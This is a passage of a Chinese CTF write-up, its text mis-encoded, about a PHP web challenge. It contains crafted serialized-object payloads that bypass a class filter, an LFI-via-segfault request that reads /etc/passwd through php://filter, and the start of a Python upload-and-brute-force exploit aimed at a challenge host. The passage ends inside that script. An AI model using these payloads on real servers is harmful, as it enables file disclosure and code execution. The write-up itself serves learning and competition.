&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;myclass.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;function.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// myclass.php
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Hello&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">qwb&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">qwb&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;?php
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">// function.php
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">function __autoload($classname){
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> require_once &amp;#34;/var/www/html/$classname.php&amp;#34;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç®€åŒ–ä¸€ä¸‹å°±æ˜¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/myClass/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ctfer&amp;#39;&lt;/span>&lt;span style="color:#111">])))){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Error: Class &amp;#39;myclass&amp;#39; not found &amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¾ˆæ˜¾ç„¶ä¸Šä¸‹æ–‡ä¸­æ²¡æœ‰myClassè¿™ä¸ªç±» äºŒæ¬¡åºåˆ—åŒ–ä¹‹åä¼šç›´æ¥æŠ¥é”™ï¼Œå…¶ä¸­ä¸€ç§å¤„ç†æ–¹å¼æ˜¯å»æ‰æœ«å°¾çš„&lt;code>}&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>O:7:&amp;#34;myclass&amp;#34;:1:{s:1:&amp;#34;h&amp;#34;;O:5:&amp;#34;Hello&amp;#34;:1:{s:3:&amp;#34;qwb&amp;#34;;s:36:&amp;#34;e2a7106f1cc8bb1e1318df70aa0a3540.php&amp;#34;;}
O%3A7%3A%22myclass%22%3A1%3A%7Bs%3A1%3A%22h%22%3BO%3A5%3A%22Hello%22%3A1%3A%7Bs%3A3%3A%22qwb%22%3Bs%3A36%3A%22e2a7106f1cc8bb1e1318df70aa0a3540%2Ephp%22%3B%7D
&lt;/code>&lt;/pre>&lt;p>æˆ–è€…å½“å±æ€§ä¸ºç©ºæ—¶ï¼Œå±æ€§å€¼ååºåˆ—åŒ–ä¹‹åä¸ä¼šèµ‹å€¼åˆ°å¯¹è±¡ä¸Šï¼Œè¿™æ ·å°±èƒ½ç»•è¿‡myclassçš„é™åˆ¶ï¼ˆä¿®æ”¹åºåˆ—åŒ–æ•°å­—å…ƒç´ ä¸ªæ•°ï¼‰&lt;/p>
&lt;pre tabindex="0">&lt;code>O:8:&amp;#34;stdClass&amp;#34;:4:{s:0:&amp;#34;&amp;#34;;O:7:&amp;#34;myclass&amp;#34;:0:{}s:1:&amp;#34;b&amp;#34;;O:5:&amp;#34;Hello&amp;#34;:1:{s:3:&amp;#34;qwb&amp;#34;,s:36:&amp;#34;e2a7106f1cc8bb1e1318df70aa0a3540.php&amp;#34;;}}
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// e2a7106f1cc8bb1e1318df70aa0a3540.php
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#d88200">&amp;#34;bff139fa05ac583f685a523ab3d110a0.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#d88200">&amp;#34;45b963397aa40d4a0063e0d85e4fe7a1.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// bff139fa05ac583f685a523ab3d110a0.php
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">PNG&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// å¤„ç†ä¸Šä¼ çš„PNGå›¾ç‰‡
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">is_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">)){&lt;/span>&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;æˆ‘ä»æ¥æ²¡æœ‰è§è¿‡ä¾¬&amp;#34;&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$first&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">imagecreatefrompng&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">$first&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;å‘ç°äº†å¥‡æ€ªçš„ä¸œè¥¿2333&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$size&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">min&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">imagesx&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$first&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#75af00">imagesy&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$first&lt;/span>&lt;span style="color:#111">));&lt;/span> &lt;span style="color:#75715e">// ä»¥æœ€å°å®½åº¦ä¸ºé™åˆ‡å‰²ä¸ºæ­£æ–¹å½¢ æˆ‘ä»¬ç›´æ¥ç”Ÿæˆçš„æ—¶å€™å°±æä¸ªæ­£æ–¹å½¢
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">unlink&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$second&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">imagecrop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$first&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;x&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;y&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;width&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#111">$size&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;height&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#111">$size&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$second&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#00a8c8">FALSE&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">imagepng&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$second&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">imagedestroy&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$second&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75715e">//é”€æ¯ï¼Œæ¸…å†…å­˜
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">imagedestroy&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$first&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 45b963397aa40d4a0063e0d85e4fe7a1.php
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">GenFiles&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$len&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$filename&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$len&lt;/span>&lt;span style="color:#111">)];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// file_put_contents(&amp;#39;/tmp/&amp;#39;.$filename,&amp;#39;flag{fake_flag}&amp;#39;);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#111">[]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;72aa377b-3fc0-4599-8194-3afe2fc9054b&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;72aa377b-3fc0-4599-8194-3afe2fc9054b&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;404.html&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/tmp/i&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">PNG&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// åŒ…å«é‚£ä¸ªPNG
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">scandir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;dd9bd165-7cb2-446b-bece-4d54087185e1&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;dd9bd165-7cb2-446b-bece-4d54087185e1&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;dd9bd165-7cb2-446b-bece-4d54087185e1&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$somthing&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">GenFiles&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">array_merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$res&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$somthing&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// /e2a7106f1cc8bb1e1318df70aa0a3540.php?72aa377b-3fc0-4599-8194-3afe2fc9054b=x&amp;amp;dd9bd165-7cb2-446b-bece-4d54087185e1=/tmp
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">shuffle&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$res&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">print_r&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$res&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬åˆ©ç”¨LFI via segmentfaulté‚£ä¸ªæŠ€å·§ | &lt;a href="https://www.jianshu.com/p/dfd049924258">LFI via SegmentFault&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>include.php?file=php://filter/string.strip_tags/resource=/etc/passwd
&lt;/code>&lt;/pre>&lt;p>&lt;code>string.strip_tags&lt;/code>å¯ä»¥å¯¼è‡´phpåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­Segment Fault&lt;/p>
&lt;p>å¦‚æœè¯·æ±‚ä¸­åŒæ—¶å­˜åœ¨ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„è¯·æ±‚ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šè¢«ä¿ç•™ï¼Œå­˜å‚¨åœ¨/tmp/phpxxxxxxxxxxxï¼ˆxxxxxæ˜¯æ•°å­—+å­—æ¯çš„6ä½æ•°ï¼‰ï¼Œè¿™ä¸ªæ–‡ä»¶è¿ç»­ä¿å­˜ï¼Œä¸ç”¨ç«äº‰ç›´æ¥çˆ†ç ´ï¼ˆå¤šçº¿ç¨‹ä¸Šä¼ æ–‡ä»¶ï¼Œç”Ÿæˆå¤šä¸ªphpxxxxxxxxxxxï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -*- coding: utf-8 -*-
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">import&lt;/span> &lt;span style="color:#75af00">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">import&lt;/span> &lt;span style="color:#75af00">string&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">import&lt;/span> &lt;span style="color:#75af00">itertools&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">charset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">base_url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://eci-2ze9gh3z7jcw29alwhuz.cloudeci1.ichunqiu.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">def&lt;/span> &lt;span style="color:#75af00">upload_file_to_include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">file_content&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;evil.jpg&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">file_content&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;image/jpeg&amp;#39;&lt;/span>&lt;span style="color:#111">)}&lt;/span>
